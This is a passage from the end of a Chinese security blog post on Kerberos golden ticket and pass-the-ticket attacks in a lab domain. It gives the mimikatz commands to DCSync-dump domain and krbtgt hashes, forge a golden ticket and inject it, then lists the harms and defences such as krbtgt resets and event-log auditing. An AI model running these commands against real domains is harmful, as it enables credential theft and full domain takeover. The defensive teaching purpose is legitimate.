+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:hack.club /all /csv  或  lsadump::lsa /inject</span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:hack.club /user:krbtgt</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:hack.club /all /csv&quot; &quot;exit&quot;&gt;loghash.txt #导出为txt文件</span><br></pre></td></tr></table></figure>
+
+<p>利用 mimikatz 生成金票.kirbi 文件并保存：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用方法：/admin：伪造的用户名，/domain：域名称，/sid：SID值（注意需去掉最后一个-后面的值），/krbtgt：krbtgt的HASH 值，/ticket：生成的票据名称 </span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;kerberos::golden /admin:test /domain:hack.club /sid:S-1-5-21-3604103733-3768248241-1190196746 /krbtgt:6a6dc4f85a612dd123c6eab0d6c33741 /ticket:goldenticket.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219165154688.png" alt="image-20251219165154688"></p>
+<p>登录域内普通用户user1，通过 mimikatz 中的 kerberos::ptt 功能将goldenticket.kirbi 导入内存中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">mimikatz # kerberos::ptt C:\Users\user1\Desktop\1\TGTticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>导入成功后，可以发现可以访问域控资源。</p>
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219171421027.png" alt="image-20251219171421027"></p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a><strong>危害</strong></h3><p>**完全域控制：**攻击者可伪造任意域用户甚至域管账户的身份，长期保持对域的完全访问权限，包括访问所有文件共享、运行任意服务、修改AD对象等。</p>
+<p>**持久性：**即使<code>krbtgt</code>账户的密码被修改，只要攻击者仍然拥有旧的<code>krbtgt</code>Hash (或没有进行双次密码重置)，他们仍然可以生成有效的黄金票据，攻击效果持久。</p>
+<p><strong>防御手段</strong></p>
+<ol>
+<li>**定期更换<code>krbtgt</code>账户的密码：**这是最核心的防御措施。官方建议每 180 天至少更换一次。在域内，<code>krbtgt</code>密码的更改需要进行两次操作，以确保所有 DC 都能正确同步。第一次重置后，需要等待一段时间（通常为 Kerberos 票据默认有效期），再进行第二次重置。这会使旧的<code>krbtgt</code>Hash 失效。</li>
+<li><strong>启用事件日志审计：</strong><ul>
+<li>尤其关注事件 ID<code>4768</code>(A Kerberos authentication ticket (TGT) was requested) 和<code>4769</code>(A Kerberos service ticket was requested)。异常的请求源、请求账户或请求模式都可能是攻击迹象。</li>
+<li>**监控 LSASS 进程访问：**检测对 LSASS 进程的异常访问，例如非特权用户尝试读取 LSASS 内存，这可能是攻击者在尝试 dump Hash。事件 ID<code>4656</code>(A handle to an object was requested) 结合<code>Access Mask</code>可以帮助识别。</li>
+</ul>
+</li>
+<li>**使用 EDR (Endpoint Detection and Response) 检测：**EDR 能够检测可疑的票据注入行为 (例如<code>mimikatz</code>的<code>sekurlsa::pth</code>操作) 以及对<code>lsass.exe</code>进程的异常访问和内存读取。</li>
+<li>**限制域控访问：**严格限制能够物理或逻辑访问域控制器的用户和设备。</li>
+<li><strong>虽然黄金票据绕过密码认证</strong>，但如果 Kerberos 服务支持 MFA，可以增加攻击的难度。</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">主页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/friends/">友链</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于我</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">Kerberos的基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">Kerberos认证流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">详细认证流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%95%E4%B8%BAPAC"><span class="toc-number">2.2.</span> <span class="toc-text">何为PAC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">模拟实战利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.3.</span> <span class="toc-text">危害</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&text=PTT票据传递攻击"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&is_video=false&description=PTT票据传递攻击"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PTT票据传递攻击&body=Check out this article: https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&name=PTT票据传递攻击&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&t=PTT票据传递攻击"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2026
+    Rone
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
